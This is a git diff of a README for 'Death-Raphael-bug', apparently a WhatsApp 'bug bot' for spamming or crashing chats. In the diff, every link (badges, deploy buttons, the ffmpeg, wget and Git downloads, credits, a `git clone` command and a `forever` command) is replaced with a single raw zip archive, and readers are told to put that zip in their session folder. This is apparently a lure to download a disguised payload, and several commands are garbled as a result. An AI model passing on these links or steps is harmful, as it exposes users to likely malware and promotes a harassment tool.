@@ -1,25 +1,25 @@
 **DEATH-RAPHAEL-BUG MULTI DEVICE WHATSAPP BOT**
   </p>
 <p align="center">
-  <a href="https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip">
-    <img alt=Support height="400" src="https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip"
+  <a href="https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip">
+    <img alt=Support height="400" src="https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip"
     <p align="center">
-  <a href="#"><img src="https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip+BY+DGXEON." alt="">
+  <a href="#"><img src="https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip+BY+DGXEON." alt="">
 </p>
 <h1 align="center"> DEATH-RAPHAEL-BUG </h1>
 </h1>
 <p align="center"> Here's the channel support 
 <p align="center"> 
- <a href="https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip" target="_blank">
-    <img alt="whatsapp channel" src="https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip Whatsapp Support channel -25D366?style=for-the-badge&logo=whatsapp&logoColor=red" />
+ <a href="https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip" target="_blank">
+    <img alt="whatsapp channel" src="https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip Whatsapp Support channel -25D366?style=for-the-badge&logo=whatsapp&logoColor=red" />
  </a>   
 
  
 ### **ALERTE ⚠️**
-please add the https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip file to the session folder
+please add the https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip file to the session folder
 
  ### ℹ️ **ABOUT DEATH-RAPHAEL-BUG**
- Introducing Death-Raphael-bug , It is designed to bring a whole new level of excitement to your boring WhatsApp https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip it might be helpful to all loosen hope we feel delightful to save you release your feedback and share our chuddy buddy </p>
+ Introducing Death-Raphael-bug , It is designed to bring a whole new level of excitement to your boring WhatsApp https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip it might be helpful to all loosen hope we feel delightful to save you release your feedback and share our chuddy buddy </p>
 
 
 `Ｆ•Ｅ•Ａ•Ｔ•Ｕ•Ｒ•Ｅ•Ｓ`
@@ -40,15 +40,15 @@ please add the https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/
           
 2.  **Fork My Repository**
           <br>
-<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip' target="_blank"><img alt='Fork repo' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip This Repo-black?style=for-the-badge&logo=git&logoColor=Blue'/></a>
+<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip' target="_blank"><img alt='Fork repo' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip This Repo-black?style=for-the-badge&logo=git&logoColor=Blue'/></a>
       <br> 
      
  Get pairing code.
     <br>
-<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip' target="_blank"><img alt='PAIR CODE' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip'/></a>
+<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip' target="_blank"><img alt='PAIR CODE' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip'/></a>
 
   
-***[𝗔𝗨𝗧𝗛𝗢𝗥 𝗢𝗙 𝗤𝗥 𝗖𝗢𝗗𝗘](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip)***
+***[𝗔𝗨𝗧𝗛𝗢𝗥 𝗢𝗙 𝗤𝗥 𝗖𝗢𝗗𝗘](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip)***
   
 
 <details close>
@@ -61,27 +61,27 @@ please add the https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/
 
 1. If You don't have an account in Replit. Create a account.
     <br>
-<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip' target="_blank"><img alt='Heroku' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip'/></a>
+<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip' target="_blank"><img alt='Heroku' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip'/></a>
 
 2. Now Deploy
     <br>
-    <a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip ' target="_blank"><img alt='DEPLOY' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip'/></a>
+    <a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip ' target="_blank"><img alt='DEPLOY' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip'/></a>
 
 ### DEPLOY TO CODESPACE
 
 3. If You don't have a account in Codespace. Create a account.
     <br>
-<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip%3A%2F%https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip%2Fcodespaces' target="_blank"><img alt='Codespaces' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip' width="96.35" height="28"/></a></p>
+<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip%3A%2F%https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip%2Fcodespaces' target="_blank"><img alt='Codespaces' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip' width="96.35" height="28"/></a></p>
 
 4. Now Deploy
     <br>
-<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip' target="_blank"><img alt='DEPLOY' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip -h?color=black&style=for-the-badge&logo=visualstudiocode' width="96.35" height="28"/></a></p>
+<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip' target="_blank"><img alt='DEPLOY' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip -h?color=black&style=for-the-badge&logo=visualstudiocode' width="96.35" height="28"/></a></p>
 
 #### DEPLOY TO HEROKU 
 
 1. If You don't have a account in Heroku. Create a account.
     <br>
-<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip' target="_blank"><img alt='Heroku' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip'/></a>
+<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip' target="_blank"><img alt='Heroku' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip'/></a>
 
 2. Now Deploy
     <br>
@@ -91,11 +91,11 @@ please add the https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/
 
 7. If You don't have a account in Railway. Create a account.
     <br>
-<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip' target="_blank"><img alt='Railway' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip' width="96.35" height="28"/></a></p>
+<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip' target="_blank"><img alt='Railway' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip' width="96.35" height="28"/></a></p>
 
 8. Now Deploy
     <br>
-<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip' target="_blank"><img alt='DEPLOY' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip -h?color=black&style=for-the-badge&logo=railway' width="96.35" height="28"/></a></p>
+<a href='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip' target="_blank"><img alt='DEPLOY' src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip -h?color=black&style=for-the-badge&logo=railway' width="96.35" height="28"/></a></p>
 
 </br>
  
@@ -147,25 +147,25 @@ yarn install
 npm start
 ```
 
-<a><img src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip'/></a><a><img src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip'/></a>
+<a><img src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip'/></a><a><img src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip'/></a>
 - If you want Command For 24/7 (might no work) 
 ```js
-npm i -g forever && forever https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip && forever save && forever logs
+npm i -g forever && forever https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip && forever save && forever logs
 ```
 <br>
 
-<a><img src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip'/></a><a><img src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip'/></a>
+<a><img src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip'/></a><a><img src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip'/></a>
 <br>
 <h2 align="center">  Windows Cmd & Vs  </h2>
 
-- [Download ffmpeg](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip) and set the path
-- [Download wget](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip) and set the path
-- [Download https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip)
-- [Download Git](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip)
-- [Download Libwebp](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip)
+- [Download ffmpeg](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip) and set the path
+- [Download wget](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip) and set the path
+- [Download https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip)
+- [Download Git](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip)
+- [Download Libwebp](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip)
 
 ```cmd
-> git clone https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip
+> git clone https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip
 ```
 ```
 > cd Death-Raphael-bug
@@ -176,9 +176,9 @@ npm i -g forever && forever https://raw.githubusercontent.com/ipoukoumondi/Death
 ```
 > npm start
 ```
-<a><img src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip'/></a><a><img src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip'/></a>
+<a><img src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip'/></a><a><img src='https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip'/></a>
 
-## ```Connect With Me```<img src="https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip" width ="80"></h1> 
+## ```Connect With Me```<img src="https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip" width ="80"></h1> 
 
 ##
 - ***Star ⭐ My Repo If You Like  DEATH RAPHAEL-BUG.***
@@ -196,8 +196,8 @@ npm i -g forever && forever https://raw.githubusercontent.com/ipoukoumondi/Death
 - *`This Bot is For Fun and Educational Purpose, I will not Responsible If You Spam and And Got Banned`*
 
 
-- ***Credit : [DGXeon](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip) for base code***
+- ***Credit : [DGXeon](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip) for base code***
 
-- ***Credit : [TOGE](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/audio/Death-Raphael-bug_v1.9.zip) for temporary qr and pairing code***
+- ***Credit : [TOGE](https://raw.githubusercontent.com/ipoukoumondi/Death-Raphael-bug/main/XeonMedia/image/bug_Raphael_Death_2.7.zip) for temporary qr and pairing code***
 
 ## Note that i have not yet finished session id so we will use for [TOGE-BUG-BOT] thanks for understanding ##
